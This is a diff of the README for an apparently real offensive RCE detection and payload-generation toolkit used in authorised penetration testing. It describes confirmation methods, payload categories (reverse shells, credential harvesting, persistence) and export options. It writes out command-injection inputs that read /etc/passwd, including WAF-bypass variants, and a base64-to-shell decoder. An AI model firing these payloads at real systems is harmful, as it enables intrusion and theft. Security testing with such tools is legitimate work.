@@ -1,221 +1,251 @@
-# RCEKit — RCE Testing Toolkit
+# RCEKit — prove RCE, don't guess it
 
-**Version 2.15.2** · MIT · Python 3.8+ · no third-party dependencies
+**Version 2.15.2** · MIT · Python 3.8+ · zero third-party dependencies
 
-RCEKit is an offensive **RCE testing toolkit** for authorised penetration
-testing, red teaming, and security research. It covers the full loop, not just
-payload generation:
+RCEKit is an **RCE detection &amp; confirmation toolkit** for authorised penetration
+testing, red teaming, and security research. Point it at a target you are allowed
+to test — a URL or a captured HTTP request — and it tells you what **actually
+executed**, backed by proof, not a "maybe".
 
-## Demo
+A **`confirmed`** verdict means the target *computed or executed a value only
+execution could produce* — random arithmetic, a template evaluation, a written
+token — checked against a payload-free control. Reflection, coincidence, and
+jitter can't fake it, so `confirmed` is something you can put in a report.
 
-RCEKit doesn't just fire payloads — it **confirms execution out-of-band** and
-correlates each callback back to the exact payload that caused it. Here it
-auto-confirms a blind Log4Shell RCE via an OOB DNS callback:
+![RCEKit auto-confirming a blind Log4Shell RCE via an OOB DNS callback, correlating the DNS hit back to the exact payload](confirmation-gifs/oob-confirm.gif)
 
-![RCEKit auto-confirming a blind Log4Shell RCE via an OOB callback, correlating the DNS hit back to the exact payload](confirmation-gifs/oob-confirm.gif)
+> *Watch it confirm a blind Log4Shell RCE via an out-of-band callback and correlate
+> the DNS hit back to the exact payload — one of several confirmation modes.*
 
-> **Generate** context-aware, sink-specific payloads → **deliver** them (or export
-> to Burp/Nuclei) → **verify** execution automatically against an authorised
-> target, including blind and out-of-band callbacks.
+---
 
-## Highlights
-
-- **Targeted generation** — payloads tailored to the **environment** (Unix, Windows, Node.js, Python, PHP, Java, .NET, Ruby, Perl, Go, GraphQL, MongoDB/NoSQL, Docker, Kubernetes), the injection **context** (with container-aware escaping for JSON/XML/YAML/headers/shell-quoted strings), and the specific execution **sink** (OS commands, SSTI, SpEL/OGNL/Groovy, Mongo `$where`, …).
-- **Executable-only output** — every payload runs as-is on its channel/sink or carries its own decoder; non-runnable transforms are removed and decoder-required blobs are opt-in, so you never copy a payload that silently does nothing.
-- **Sink-aware target profiles** — describe the target once (denied characters, max length, needs-separator, blind, decodes-input) and emit only payloads that could actually fire.
-- **Auto-verification** — `--verify-url` fires payloads at an authorised target and reports which executed, using each payload's built-in oracle: a `match` regex, a reflected canary, or a timing delay. Confirmation is **differential**, so `confirmed` means execution and not coincidence: a timing hit must clear a noise-aware margin over a multi-sample baseline *and* reproduce on a re-fire, a reflected canary is re-checked against a paired same-token control so a target that merely echoes input is not mistaken for execution, and a command-output signature already present in the payload-free response is reported `inconclusive` instead of a false positive.
-- **Raw request input** — `-r request.txt` injects into a captured HTTP request (proxy/Burp style) instead of a hand-built URL. Mark the point with `FUZZ`/`*` or pick a parameter with `-p NAME`; RCEKit reuses the request's method, path, headers, body and cookies and **encodes each injection point for the context it lands in** (query / form / JSON / header / cookie).
-- **Results-based detection** — `--methods reflected` confirms RCE by forcing the target's shell to compute an arithmetic value on **random operands** (`$((a+b))` plus a `$(echo TAG)` substitution collapse) and checking that value appears in the response but not in a payload-free control. A target that merely echoes the payload returns the literal `$((a+b))`, never the sum, so reflection cannot fake a `confirmed`. Confirmed (execution proven) and needs-review (candidate) verdicts are reported as **separate tiers, never merged**.
-- **No-egress detection** — `--methods file` confirms RCE on internal targets with **no outbound connectivity**: the probe writes a random token to a web-reachable file and a followup request fetches it back, proving execution *and* a write primitive through the target's own web server — no external listener. State-changing and gated on `--webroot` + `--web-base-url`; every finding prints a **cleanup command**.
-- **Expression / template injection** — `--methods eval` confirms SSTI / SpEL / OGNL / Groovy / raw-`eval` sinks by injecting `a*b` on **random operands** wrapped in each common syntax (`${…}`, `{{…}}`, `#{…}`, `%{…}`, `<%= … %>`, `@(…)`, bare) and checking the **product** appears while the literal `a*b` does not. Same computed-value invariant as results-based detection, for an expression evaluator instead of a shell.
-- **Hardened blind timing** — `--methods time` fires a controlled `0/N/2N` delay series and requires the response time to track the injected delay **linearly** (a monotonic increase whose extra latency matches the sleep within a noise margin), so jitter cannot fake it. Timing has no computed value, so it is reported `needs-review`, **never** `confirmed` on its own — pair it with `--methods reflected` for an execution proof it corroborates.
-- **Built-in OOB listener** — `--listen` receives HTTP/DNS callbacks and correlates each back to the exact payload, closing the blind-RCE loop without a separate interactsh/Collaborator.
-- **Tooling integrations** — export as context-split Burp wordlists, a ready-to-run ffuf attack (`request.txt` + `run.sh`) when a target profile is given, or runnable Nuclei templates with built-in OOB / time-based / reflection oracles.
-- **Safe by default** — a benign `--detection-only` canary mode, safety tiers, a consent gate, and audit logging.
-
-## Install
+## Quick start
 
 ```bash
 git clone https://github.com/kabiri-labs/rcekit.git
-cd rcekit        # Python 3.8+, standard library only
+cd rcekit                    # Python 3.8+, standard library only — nothing to install
 ```
 
-Generated payload files (`*.txt`, `*.meta.jsonl`, `*.map.jsonl`) and runtime logs
-are `.gitignore`d and regenerated on demand.
-
-## Quick Start
+Put a `FUZZ` marker where your input lands, and ask RCEKit to prove RCE:
 
 ```bash
-# 1. Benign probes (no consent needed) — check whether your input reaches a sink
-python rcekit.py --detection-only --output detect.txt
-
-# 2. Generate targeted payloads for an authorised engagement
 python rcekit.py --acknowledge-consent \
-  --environments unix --categories basic_enum file_operations waf_bypass \
-  --output payloads.txt
-
-# 3. Fire them at an authorised target and auto-confirm what executed
-python rcekit.py --acknowledge-consent \
-  --environments unix --categories basic_enum file_operations waf_bypass \
-  --verify-url "https://target.example/lookup?host=FUZZ"
-
-# 4. Catch blind / out-of-band callbacks and map them back to payloads
-python rcekit.py --listen --correlate payloads.txt.map.jsonl
+  --verify-url "https://target.example/lookup?host=FUZZ" \
+  --methods reflected,eval
 ```
 
-Exploitation payloads require `--acknowledge-consent`; `--detection-only` is benign
-and does not. Only run any of this against systems you are authorised to test.
+```
+[detect] methods: reflected, eval
+[detect] sent 13 probes: confirmed=4, negative=9
 
-If the payload corpus is missing or corrupt (for example quarantined by EDR after
-clone), RCEKit refuses to run and exits non-zero instead of silently generating
-nothing. Run `python rcekit.py --doctor` to check corpus integrity.
+[detect] CONFIRMED execution (4):
+  [reflected/unix/raw] ; echo RKYZRIP$((540141+314681))RKFWVFS$(echo RKBWOOC)RKYZRIP
+      (target computed 'RKYZRIP854822RKFWVFSRKBWOOCRKYZRIP' — random operands, absent from control)
+```
 
-## Options
+No external infrastructure, no config file. If nothing is vulnerable you get a
+clean `negative`, not a false alarm. That's the whole idea.
 
-| Option | Description | Default |
-|--------|-------------|---------|
-| `-o, --output` | Output file (or base directory for `burp`/`nuclei`) | `rce_payloads.txt` |
-| `--environments` | Environments to generate | All |
-| `--categories` | Categories to generate | All |
-| `--contexts` | Injection contexts to generate | Default (language/structural) set |
-| `--encodings` | Encodings to apply | Default (self-contained) set |
-| `--output-format` | `text`, `jsonl`, `burp`, `ffuf`, or `nuclei` | `text` |
-| `--max-payloads` | Cap the number of payloads (balanced round-robin sample across categories/environments) | Unlimited |
-| `--attacker-ip` / `--attacker-domain` | Substituted into reverse-shell / download payloads | `192.168.1.100` / `attacker.com` |
-| `--template-file` | Custom JSON payload templates | `templates/payloads.json` |
-| `--doctor` | Check corpus integrity (template found, parses, payload counts) and exit non-zero if missing/empty | Off |
-| `--detection-only` | Benign canary/timing probes for safe validation | Off |
-| `--include-metadata` | Write a `.meta.jsonl` sidecar (indicators, safety tiers, notes) | Off |
-| `--max-safety` | Highest safety tier: `safe`, `intrusive`, `stateful` | `safe` (detection) / `intrusive` |
-| `--include-blocking` | Include blocking/timing probes | Off |
-| `--acknowledge-consent` | Required to generate/fire exploitation payloads | Off |
-| `--watermark` | Embed a traceable token in each payload (audit logging happens regardless) | Off |
-| **Out-of-band** | | |
-| `--oob-domain` | Collaborator/interactsh domain; each payload gets a unique subdomain token | None |
-| `--verify-url` | Authorised target URL with a `FUZZ` marker; fire and confirm execution | None |
-| `--verify-data` / `--verify-header` / `--verify-method` | Body (with `FUZZ`) / repeatable header / HTTP method | — |
-| `--verify-url-location` / `--verify-body-location` | How to encode the payload at the URL / body injection point | `query_value` / auto |
-| `--verify-delay` / `--verify-timeout` | Seconds between requests / per-request timeout | `0` / `8` |
-| `-r`, `--request-file <path>` | Raw HTTP request to inject into (alternative to `--verify-url`); mark with `FUZZ`/`*` or select with `-p` | None |
-| `-p`, `--param <name>` | Parameter/field/header/cookie to inject into for `-r` (query > body > header > cookie) | None |
-| `--request-scheme {http,https}` | Scheme for the URL built from `-r` (default: https if Host is `:443`, else http) | auto |
-| `--methods <list>` | Run named detection methods against `--verify-url`/`-r` instead of the classic per-payload oracle (`reflected`, `eval`, `file`, `time`). Opt-in and additive | None |
-| `--webroot <path>` | (file-based) server-side directory the target can write to and serve | None |
-| `--web-base-url <url>` | (file-based) base URL that serves `--webroot` | None |
-| `--time-base <seconds>` | (time-based) base delay `N`; the regression fires `0/N/2N` and requires the response time to track it | `2.0` |
-| `--evade {none,low}` | WAF posture for `--methods` shell probes; `low` applies a minimal `${IFS}`-for-spaces transform (not aggressive evasion) | `none` |
-| `--verify-active-risk` | Highest safety tier `--verify-url` may fire (`safe`/`intrusive`/`stateful`) | `safe` |
-| `--verify-allow-destructive` | Let verification fire destructive payloads (persistence/backdoors); skipped by default | Off |
-| `--verify-chain <profile.json>` | Deliver each payload through a multi-step, session-aware flow (login/CSRF → prerequisites → payload delivery → trigger) and confirm in-band or out-of-band | None |
-| `--listen` + `--correlate <map.jsonl>` | Run the OOB listener and map callbacks to payloads | Off |
-| `--listen-http-port` / `--listen-dns-port` / `--listen-answer-ip` / `--listen-log` | Listener HTTP/DNS ports, DNS answer IP, hit log | `8080` / `5335` / `127.0.0.1` / — |
-| **Targeting** | | |
-| `--target-profile` | JSON profile of the target (supplies defaults CLI flags override) | None |
-| `--deny-chars` / `--max-length` | Drop payloads containing these chars / longer than this | None |
-| `--sink-needs-separator` | Sink concatenates input mid shell command → keep only separator-led payloads | Off |
-| `--sink-blind` | Sink returns no output → keep only OOB/timing-confirmable payloads | Off |
-| `--sink-decodes` | Encodings the sink decodes (e.g. `base64`) → those variants become valid | None |
+---
 
-## Environments, Categories, Contexts, Encodings
+## Why RCEKit
+
+Finding an RCE *candidate* is easy. **Proving it** — reliably, without crying
+wolf — is the hard part:
+
+- Scanners flag "possibly vulnerable" and bury the real finding under false positives.
+- Blind RCE usually forces you to stand up interactsh/Collaborator just to confirm.
+- Each RCE class (command injection, SSTI, code injection) needs a different confirmation trick.
+- A report full of "maybe" findings wastes triage time and burns your credibility.
+
+RCEKit answers with **two verdict tiers that are never merged**:
+
+| Tier | Meaning |
+|------|---------|
+| **`confirmed`** | Execution proven — the target returned a value it could only produce by executing your input, and that value is absent from a payload-free control. |
+| **`needs-review`** | A real candidate worth a look (e.g. a blind timing signal), but not proof on its own. |
+
+Anything else is `negative` or `inconclusive`. The moment "confirmed" and "maybe"
+blur together, "confirmed" loses its meaning — so RCEKit keeps them apart, by design.
+
+---
+
+## What it confirms
+
+One CLI, one `--methods` flag, covering the main paths to RCE:
+
+| RCE class | `--methods` | How RCEKit proves it |
+|-----------|-------------|----------------------|
+| **OS command injection** | `reflected` | Makes the shell compute `$((a+b))` on random operands and collapse `$(echo TAG)`; confirms the *result*, never the literal expression. |
+| **Code / expression injection** — SSTI, SpEL, OGNL, Groovy, `eval()` (CWE-94) | `eval` | Injects `a*b` in every common template syntax (`${…}` `{{…}}` `#{…}` `%{…}` `<%=…%>` `@(…)`, bare); confirms the **product** appears while the literal `a*b` does not. |
+| **Blind command injection** (no output) | `time` | Fires a controlled `0/N/2N` delay series and confirms the response time tracks the delay **linearly**; reported `needs-review` (jitter can't fake it, but timing isn't a computed value). |
+| **Internal / no-egress** targets | `file` | Writes a random token to a web-reachable file and fetches it back — proving execution **plus** a write primitive, with no external listener. |
+| **Blind / out-of-band** — Log4Shell/JNDI, exfil, async | *(OOB listener)* | Built-in HTTP/DNS listener receives callbacks and correlates each to the exact payload. |
+
+Mix them freely: `--methods reflected,eval,time` runs all three and reports each
+tier separately.
+
+> **Honest scope.** RCEKit confirms RCE that is reachable by **injecting into a
+> request** and interpreted by a shell or an evaluator. It does **not** cover
+> memory-corruption bugs (buffer overflow, UAF), argument injection into a
+> no-shell `argv` array, or confirm deserialization gadget chains beyond a timing
+> signal — those are different problems. It aims to be excellent at the
+> injection-driven RCE classes above rather than mediocre at everything.
+
+---
+
+## Usage
+
+Everything below needs `--acknowledge-consent` — RCEKit actively sends payloads,
+so only ever run it against systems you are authorised to test.
+
+### Point at a URL
+
+Mark the injection point with `FUZZ` (in the URL, `--verify-data` body, or a
+`--verify-header`). Method defaults to GET, or POST when you pass `--verify-data`.
+
+```bash
+# GET query parameter
+python rcekit.py --acknowledge-consent \
+  --verify-url "https://target.example/lookup?host=FUZZ" --methods reflected
+
+# JSON body — "; id" is delivered inside the JSON string, not %3B%20id
+python rcekit.py --acknowledge-consent \
+  --verify-url "https://target.example/api" --verify-method POST \
+  --verify-header "Content-Type: application/json" \
+  --verify-data '{"host": "FUZZ"}' --methods reflected
+```
+
+RCEKit encodes the payload for the **exact injection point it lands in** — a query
+value is percent-encoded, a JSON field is JSON-escaped, a form field is
+form-encoded, a header stays single-line — so it reaches the sink intact instead
+of being blanket-encoded into a literal the sink never decodes.
+
+### Point at a captured request (`-r`)
+
+Skip rebuilding the request by hand. Save a request from Burp/your proxy and let
+RCEKit reuse its method, path, headers, body, and cookies:
+
+```bash
+python rcekit.py --acknowledge-consent -r request.txt -p host --methods reflected
+```
+
+Mark the point inline with `FUZZ` or `*`, or select a parameter with `-p NAME`
+(searched query → body → header → cookie). Each injection point is still encoded
+for its own context. Scheme is inferred (`https` on `:443`, else `http`;
+`--request-scheme` to override) and `Host`/`Content-Length` are recomputed.
+
+### Blind and no-egress targets
+
+```bash
+# No output channel, but you control a writable web root → prove it with a file
+python rcekit.py --acknowledge-consent \
+  --verify-url "https://target.example/ping?ip=FUZZ" \
+  --methods file --webroot /var/www/html --web-base-url https://target.example
+
+# No output and no egress at all → hardened blind timing (a needs-review candidate),
+# corroborated by a results-based proof when any output channel exists
+python rcekit.py --acknowledge-consent \
+  --verify-url "https://target.example/ping?ip=FUZZ" \
+  --methods reflected,time --time-base 3
+```
+
+`file` changes target state (one file per confirmed probe), so it is gated behind
+`--webroot` + `--web-base-url` and prints an exact `rm`/`del` **cleanup command**
+for every finding.
+
+### WAF in the way?
+
+The default sends **clean, canonical** payloads — fewest variants, clearest
+confirmation, lowest false positives — assuming authorised, WAF-free access.
+`--evade low` opts into a single low-touch transform (`${IFS}` for spaces) for the
+shell probes. It is deliberately minimal, not noisy evasion.
+
+```bash
+python rcekit.py --acknowledge-consent \
+  --verify-url "https://target.example/ping?ip=FUZZ" --methods reflected --evade low
+```
+
+### Reading the results
+
+- **`confirmed`** — execution proven. The evidence line shows the exact value the
+  target computed. Put it in the report.
+- **`needs-review`** — a candidate (e.g. a linear timing response). Worth manual
+  follow-up; not proof.
+- **`negative`** / **`inconclusive`** — no evidence, or evidence that also appears
+  without the payload (so it isn't attributable to execution).
 
 <details>
-<summary><b>Environments</b></summary>
+<summary><b>How a <code>confirmed</code> can't be a false positive</b></summary>
 
-`unix`, `windows`, `nodejs`, `python`, `php`, `java`, `dotnet`, `ruby`, `perl`,
-`go`, `docker`, `kubernetes`, `graphql` (introspection / argument injection /
-batching), `mongodb` (operator injection / `$where` / `$function`).
+Every confirmation is **differential** and built on a value RCEKit picked at
+random, so reflection or coincidence can't produce it:
+
+- **Results-based (`reflected` / `eval`)** — the expected value is a tag-wrapped
+  sum or a boundary-fenced product of random operands. A target that merely echoes
+  the payload returns the literal `$((a+b))` / `a*b`, never the computed value.
+  The value is also checked against a payload-free control, and the search is
+  encoding-aware (a base64/hex/url/html-encoded output still confirms).
+- **Timing (`time`)** — a controlled `0/N/2N` series must produce a *linear*
+  response-time increase; a one-off slow response (jitter) fails the regression.
+  Timing has no computed value, so it never self-confirms — it stays `needs-review`
+  and is corroborated by a results-based proof when a channel exists.
+- **File (`file`)** — the fetched file must contain the random token; a stale file
+  can't match because the filename and token are fresh each run.
+
 </details>
+
+---
+
+## The arsenal — generation &amp; exports
+
+Under the detection engine, RCEKit is still a strong payload **generator**: it
+builds context- and sink-aware payloads across 14 environments and exports them to
+the tools you already use.
+
+```bash
+# Benign probes (no consent needed) — does your input even reach a sink?
+python rcekit.py --detection-only --output detect.txt
+
+# Targeted payloads for an engagement
+python rcekit.py --acknowledge-consent \
+  --environments unix --categories basic_enum file_operations waf_bypass --output payloads.txt
+
+# Export to Burp / ffuf / Nuclei
+python rcekit.py --acknowledge-consent --categories code_execution \
+  --output-format nuclei --output run
+```
+
+- **`burp`** — deduplicated, watermark-free wordlists split per context, plus a
+  combined list. A `request.txt` with Burp's `§…§` marker is written when a target
+  profile supplies a real request.
+- **`ffuf`** — the same wordlists and, with a profile `request` block, a ready-to-run
+  `request.txt` + executable `run.sh`.
+- **`nuclei`** — runnable templates grouped by environment and oracle (OOB /
+  time-based / reflection). For the fullest pack: `--detection-only --output-format nuclei`.
+
+Every generated payload runs as-is on its sink or carries its own decoder —
+non-runnable transforms are removed and decoder-required blobs are opt-in, so you
+never copy a payload that silently does nothing.
+
+---
+
+## Going further
 
 <details>
-<summary><b>Categories</b></summary>
+<summary><b>Target profiles</b> — describe the target once, generate only what can fire</summary>
 
-| Category | Purpose |
-|----------|---------|
-| `basic_enum` | Identity / host / process / OS enumeration |
-| `file_operations` | File access and sensitive-file reads |
-| `network_operations` | Network configuration and discovery |
-| `code_execution` | Language-specific execution, at sink-level granularity |
-| `download_execute` | Download-and-run payloads |
-| `reverse_shells` | Reverse shells across environments |
-| `credential_access` | Credential, token, and secret harvesting |
-| `privilege_escalation` | sudo / service / platform priv-esc checks |
-| `persistence` | Common persistence tradecraft (lab only) |
-| `cloud_metadata` | Cloud instance-metadata harvesting |
-| `database_enumeration` | SQL/NoSQL discovery and schema inspection |
-| `lateral_movement` | SSH / WinRM / PsExec expansion checks |
-| `container_escape` | Docker / Kubernetes hardening checks |
-| `waf_bypass` | Quote-free / space-free command injection (`${IFS}`, `{cat,/etc/passwd}`) |
-| `oob` | Out-of-band DNS/HTTP callbacks and JNDI/Log4Shell (needs `--oob-domain`) |
-| `nosql_injection` | Mongo operator injection, `$where` server-side JS, blind timing |
-| `graphql_injection` | GraphQL introspection, resolver-argument injection, batching |
-</details>
-
-<details>
-<summary><b>Contexts</b> — each carries an escape rule so the payload survives its container</summary>
-
-**Language / structural break-outs** (default set): `raw`, `html`, `attribute`,
-`attribute_unquoted`, `javascript`, `sql`, `php`, `unix_shell`, `windows_cmd`,
-`powershell`, `shell_single_quoted`, `shell_double_quoted`, `graphql_string`.
-
-**Transport / serialization** (opt-in via `--contexts`; carry *any* environment's
-payload and escape it for the wire): `json`, `graphql_variable`, `xml`,
-`xml_cdata`, `yaml`, `http_header`.
-
-A payload placed in a `json` string has its quotes/backslashes escaped; in `xml`
-it is entity-escaped; in `shell_single_quoted` it breaks out of the quotes — so
-it stays valid inside the container and reaches the sink intact.
-</details>
-
-<details>
-<summary><b>Encodings</b> — default set is always directly usable; blobs are opt-in</summary>
-
-**Default (self-contained):** `none`, `url_encode`, `double_url_encode`,
-`random_case` (case-insensitive runners only), and `base64_decode_exec`
-(carries its own `base64 -d|sh` decoder; shell runners only).
-
-**Decoder-required (opt-in via `--encodings`):** `base64`, `hex`,
-`base64_then_url`, `double_base64`. These are bare blobs that only execute where
-the *sink itself* decodes the input; requesting them for text output without
-`--include-metadata` prints a warning. Use `--sink-decodes base64` to mark them
-valid for a known-decoding sink.
-
-Non-runnable transforms (ROT13, XOR/chunk shuffling, byte splicing) were removed.
-</details>
-
-<details>
-<summary><b>Code-execution sinks</b> (for <code>--categories code_execution</code>)</summary>
-
-- **nodejs** — `child_process_exec`, `pug_ssti`, `ejs_ssti`, `handlebars_ssti`, `vm_eval`, `deserialization`, `expression_template` (server-side `{{ }}` expression sandbox escape, e.g. n8n)
-- **python** — `os_system`, `subprocess`, `jinja2_ssti`, `exec_ast` (function-definition / decorator / default-arg execution in `exec`-of-AST validators, e.g. Langflow)
-- **postgres** — `psql_meta_command` (`\!` shell meta-command, including the CR (`\r`) validator bypass, e.g. pgAdmin restore)
-- **php** — `exec_system`, `eval`, `deserialize`
-- **java** — `runtime_exec`, `freemarker_ssti`, `velocity_ssti`, `thymeleaf_ssti`, `spel`, `ognl`, `groovy`, `deserialization`, `expression`
-- **dotnet** — `process_start`, `deserialize`
-- **ruby** — `kernel_system`, `erb_ssti`
-- **perl** — `system_backticks`
-- **go** — `os_exec`
-- **mongodb** (`nosql_injection`) — `operator_injection`, `where_js`, `server_side_js`
-- **graphql** (`graphql_injection`) — `introspection`, `injection`, `batching`
-
-Payloads are emitted verbatim so each snippet stays syntactically valid for its
-sink; encoding variants are applied separately and labelled in metadata.
-</details>
-
-## Target Profiles
-
-Describe the target once and generate only what could reach the sink. A profile
-is a small JSON file (fields supply defaults; explicit CLI flags override them):
+A small JSON file supplies defaults (explicit CLI flags override them) and narrows
+generation to what could actually reach the sink:
 
 ```json
 {
   "name": "shell-concat-noquotes",
   "environments": ["unix"],
   "contexts": ["raw"],
-  "categories": ["basic_enum", "file_operations", "waf_bypass", "oob"],
-  "encodings": ["none"],
+  "categories": ["basic_enum", "file_operations", "waf_bypass"],
   "deny_chars": ["'", "\""],
-  "sink_needs_separator": true,
-  "oob_domain": "your-id.oast.pro"
+  "sink_needs_separator": true
 }
 ```
 
@@ -223,262 +253,41 @@ is a small JSON file (fields supply defaults; explicit CLI flags override them):
 python rcekit.py --acknowledge-consent --target-profile profiles/shell-concat-noquotes.json
 ```
 
-- `deny_chars` / `max_length` filter the **final** payload — a URL-encoded quote survives a quote filter because the literal character is gone.
-- **Sink shape** narrows generation to what can actually fire: `sink_needs_separator` (mid-command injection → separator-led break-outs only), `sink_blind` (no output → OOB/timing only), `sink_decodes` (input is decoded → those encodings become valid). Against a mid-command sink, `sink_needs_separator` dropped ~20% of payloads *without losing a single confirmed hit*.
+- `deny_chars` / `max_length` filter the **final** payload (a URL-encoded quote
+  survives a quote filter because the literal character is gone).
+- **Sink shape** narrows generation: `sink_needs_separator` (mid-command injection
+  → separator-led break-outs only), `sink_blind` (no output → OOB/timing only),
+  `sink_decodes` (input is decoded → those encodings become valid). Against a
+  mid-command sink, `sink_needs_separator` dropped ~20% of payloads *without losing
+  a single confirmed hit*.
+- A `request` block (URL/method/headers/body with `FUZZ`) shapes the Burp/ffuf/Nuclei
+  exports to the real endpoint. Example profiles ship in [`profiles/`](profiles/).
 
-A profile may also carry a **`request`** block describing the target request
-(URL/path, method, headers, body) with a `FUZZ` marker. The `burp` and `nuclei`
-exports then shape their output to the real endpoint instead of a generic
-`?rcekit=` parameter:
+</details>
 
-```json
-"request": {
-  "url": "/api/v1/lookup",
-  "method": "POST",
-  "headers": {"Content-Type": "application/json"},
-  "body": "{\"host\": \"FUZZ\"}"
-}
-```
+<details>
+<summary><b>Multi-step / session-aware verification</b> — auth, file-upload, blind/async sinks</summary>
 
-Example profiles ship in [`profiles/`](profiles/) (including `json-api-post.json`).
-
-## Verifying Against a Target
-
-`--verify-url` fires the payloads at an **authorised** target and reports which
-executed, using each payload's oracle. Put a `FUZZ` marker where the payload goes
-(also works in `--verify-data` and `--verify-header`; method defaults to GET, or
-POST with `--verify-data`).
-
-```bash
-python rcekit.py --acknowledge-consent \
-  --environments unix --categories basic_enum file_operations waf_bypass \
-  --verify-url "https://target.example/lookup?host=FUZZ"
-```
-
-The payload is encoded for the **injection point it lands in**, so it reaches the
-sink intact rather than being blanket URL-encoded. The URL marker is percent-
-encoded as a query value (`--verify-url-location url_path`/`raw` to change it),
-and the `--verify-data` marker is auto-detected from the `Content-Type`/body
-shape: a JSON body is JSON-escaped only (never percent-encoded, which would hand
-the sink a literal `%3B%20id`), an `x-www-form-urlencoded` body is form-encoded,
-anything else is sent verbatim. Override with `--verify-body-location
-json_string|form_value|raw`.
-
-```bash
-# JSON body: "; id" is delivered as-is inside the JSON string, not %3B%20id
-python rcekit.py --acknowledge-consent --environments unix --categories basic_enum \
-  --verify-url "https://target.example/api" --verify-method POST \
-  --verify-header "Content-Type: application/json" \
-  --verify-data '{"host": "FUZZ"}'
-```
-
-```
-[verify] sent 270 unique payloads: confirmed=44, no-match=86, no-signature=140
-
-[verify] CONFIRMED execution (44):
-  [file_operations/raw] ; cat /etc/passwd            (matched /root:.*?:0:0:/)
-  [waf_bypass/raw]      ; cat${IFS}/etc/passwd        (matched /root:.*?:0:0:/)
-```
-
-Confirmation is differential to avoid false positives: the timing oracle samples
-the baseline several times and requires a candidate delay to both clear a
-noise-aware margin and reproduce on a second fire (a one-off slow response is
-reported `no-delay`). The timing threshold and per-request timeout adapt to each
-payload's own `expected_delay_ms` (parsed from the sleep call, runtime-aware), so
-a short sleep that the old flat 2s floor could never confirm now can, and a
-request that hangs past the timeout is reported `timing-candidate-on-timeout`
-(the hang may be the expected delay) rather than a flat `error`. The reflection
-oracle reports `inconclusive` rather
-than a false `confirmed` when the match is not proof of execution: a canary hit
-is re-checked against a paired **same-token control** (the token in an inert,
-non-executing carrier at the same injection point), so a target that merely
-echoes input cannot pass as execution, and a command-output signature is checked
-against the payload-free baseline response.
-
-### Injecting into a captured request (`-r`)
-
-Point RCEKit at a raw HTTP request saved from a proxy instead of rebuilding the
-URL, body and headers by hand. Mark the injection point with `FUZZ` or `*`, or
-select a parameter with `-p NAME` (searched in this order: query → body →
-header → cookie):
-
-```bash
-# request.txt is a proxy-captured request; inject into the `host` parameter
-python rcekit.py --acknowledge-consent --environments unix \
-  -r request.txt -p host --methods reflected
-```
-
-The request's method, path, headers, body and cookies are reused as-is; only the
-chosen point carries the payload, encoded for **its** context — a query value is
-percent-encoded, a JSON field is JSON-escaped, a form field is form-encoded, a
-header/cookie value is kept single-line. The scheme defaults to `https` when the
-`Host` is on `:443` and `http` otherwise (override with `--request-scheme`); the
-`Host` and `Content-Length` headers are recomputed automatically. One injection
-point per run in this release — `--all-params` enumeration is planned.
-
-### Results-based detection (`--methods reflected`)
-
-The oracles above key off each payload's *own* signature. `--methods reflected`
-adds a stronger, results-based proof: instead of a fixed signature it makes the
-target's shell **compute a value RCEKit picked at random**, so only execution can
-produce it.
-
-```bash
-python rcekit.py --acknowledge-consent --environments unix \
-  --verify-url "https://target.example/lookup?host=FUZZ" --methods reflected
-```
-
-```
-[detect] methods: reflected
-[detect] sent 6 probes: confirmed=4, negative=2
-
-[detect] CONFIRMED execution (4):
-  [reflected/unix/raw] ; echo RKYZRIP$((540141+314681))RKFWVFS$(echo RKBWOOC)RKYZRIP   (target computed 'RKYZRIP854822RKFWVFSRKBWOOCRKYZRIP' ...)
-```
-
-Each probe carries two independent proofs: arithmetic on random operands
-(`$((a+b))` — the response must contain the *sum*, never the literal expression)
-and a `$(echo TAG)` substitution collapse (proof the shell *ran* the
-substitution). The computed value is checked with the same encoding-aware search
-and payload-free control as the classic oracle, so a target that only echoes
-input is reported `negative`, and a value that also appears without the payload is
-`inconclusive` — never `confirmed`. Verdicts are split into two tiers,
-`confirmed` (execution proven) and `needs-review` (candidate), and never merged.
-Unix and Windows (`set /a`) shells are covered; the method is opt-in, so omitting
-`--methods` leaves the classic `--verify-url` behaviour unchanged.
-
-### Expression / template injection (`--methods eval`)
-
-The same computed-value idea, aimed at **expression evaluators** rather than a
-shell — server-side template injection (Jinja2, Twig, Freemarker, Thymeleaf),
-SpEL, OGNL/Struts, Groovy, and raw `eval()` sinks. It injects `a*b` on random
-operands wrapped in each common syntax and confirms only when the target returns
-the **product**:
-
-```bash
-python rcekit.py --acknowledge-consent --environments python \
-  --verify-url "https://target.example/render?name=FUZZ" --methods eval
-```
-
-Probes cover `${a*b}`, `{{a*b}}`, `#{a*b}`, `%{a*b}`, `<%= a*b %>`, `@(a*b)` and
-a bare `a*b`. A template that renders the payload verbatim echoes `a*b` and never
-the product, so reflection can't fake it; the product is matched on digit
-boundaries and differenced against the payload-free control, so a coincidental
-number in the page is reported `inconclusive`, not `confirmed`. Probe payloads
-depend only on the injection context, so each syntax is tried once per context.
-
-### No-egress detection (`--methods file`)
-
-When the target is internal and cannot reach out (no OOB callback possible),
-`--methods file` confirms execution through the target's **own** web server:
-the probe writes a random token to a file under the web root, and a followup
-request fetches it back. The token appears only if the command ran *and* the
-write landed — proving execution plus a write primitive.
-
-```bash
-python rcekit.py --acknowledge-consent --environments unix \
-  --verify-url "https://target.example/lookup?host=FUZZ" \
-  --methods file --webroot /var/www/html --web-base-url https://target.example
-```
-
-```
-[detect] file-based method WRITES to /var/www/html on the target and fetches via https://target.example; each confirmed finding lists a cleanup command.
-
-[detect] CONFIRMED execution (1):
-  [file/unix/raw] ; echo RK... > /var/www/html/rcekit-<rand>.txt   (target wrote and served token ...)
-      cleanup: rm -f /var/www/html/rcekit-<rand>.txt
-```
-
-This method **changes target state** (one file per confirmed probe), so it is
-gated on both `--webroot` (where the target can write) and `--web-base-url` (the
-URL that serves it), and every finding prints the exact `rm`/`del` command to
-undo the write. The random filename and token mean a stale file can never pass
-as a fresh confirmation.
-
-### Hardened blind timing (`--methods time`)
-
-When there is no output channel and no egress at all, the only signal left is
-*how long* the target takes to respond. Naive time-based checks false-positive on
-jitter; `--methods time` instead fires a **controlled series** — delays `0`, `N`,
-`2N` (set `N` with `--time-base`), each repeated — and requires the response
-time to track the injected delay **linearly**: monotonic, with the extra latency
-at each step matching the sleep within a noise margin. A random slow response
-fails that regression.
-
-```bash
-python rcekit.py --acknowledge-consent --environments unix \
-  --verify-url "https://target.example/lookup?host=FUZZ" \
-  --methods reflected,time --time-base 3
-```
-
